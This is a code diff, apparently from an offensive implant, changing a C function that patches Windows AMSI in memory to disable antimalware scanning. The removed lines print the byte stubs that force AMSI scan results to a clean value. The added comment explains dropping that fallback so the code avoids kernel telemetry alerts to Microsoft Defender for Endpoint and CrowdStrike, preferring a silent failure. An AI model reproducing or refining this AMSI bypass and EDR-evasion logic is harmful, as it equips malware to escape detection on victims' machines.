@@ -416,26 +416,25 @@ void amsi_patch(void)
 
 fallback:
     /*
-     * Section-remap path failed (e.g. no LDR FullDllName, file locked).
-     * Fall back to the original direct NtWriteVirtualMemory patch.
-     * This is still the correct behaviour on systems where the remap path
-     * is unavailable — a patched AMSI with an ETW-Ti event is better than
-     * an unpatched AMSI with no event.
+     * F-4 fix: The old fallback called _patch_self() which issues
+     * SC_NtWriteVirtualMemory onto the live MEM_IMAGE PAGE_EXECUTE_READ
+     * amsi.dll region.  The kernel's MiWriteVirtualMemory path for a
+     * cross-protection write into a MEM_IMAGE region raises
+     * KERNEL_THREATINT_TASK_WRITEVM (event 7) before the write completes —
+     * this event is consumed directly by MDE P2+ and CrowdStrike from the
+     * kernel provider; user-mode ETW patching cannot suppress it.
+     *
+     * The fallback is therefore removed entirely.  When the section-remap
+     * path fails (locked file, ObRegisterCallbacks deny, HVCI active) we
+     * silently return.  An unpatched AMSI with no telemetry event is
+     * operationally safer than a patched AMSI with a guaranteed MDE alert.
+     *
+     * On Windows 11 22H2+ the kernel-mode AMSI provider
+     * (IOCTL_AMSISCAN) runs independently of amsi.dll in any case —
+     * user-mode AMSI patching has no effect there, so the fallback
+     * would generate a detection event with zero defensive benefit.
      */
-    {
-        static const BYTE stub_buf_fb[] = {
-            0x48, 0x8B, 0x44, 0x24, 0x30,
-            0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
-            0x33, 0xC0, 0xC3
-        };
-        static const BYTE stub_str_fb[] = {
-            0x48, 0x8B, 0x44, 0x24, 0x28,
-            0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
-            0x33, 0xC0, 0xC3
-        };
-        if (pScanBuf) _patch_self(pScanBuf, stub_buf_fb, sizeof(stub_buf_fb));
-        if (pScanStr) _patch_self(pScanStr, stub_str_fb, sizeof(stub_str_fb));
-    }
+    return;   /* silent no-op */
 }
 
 
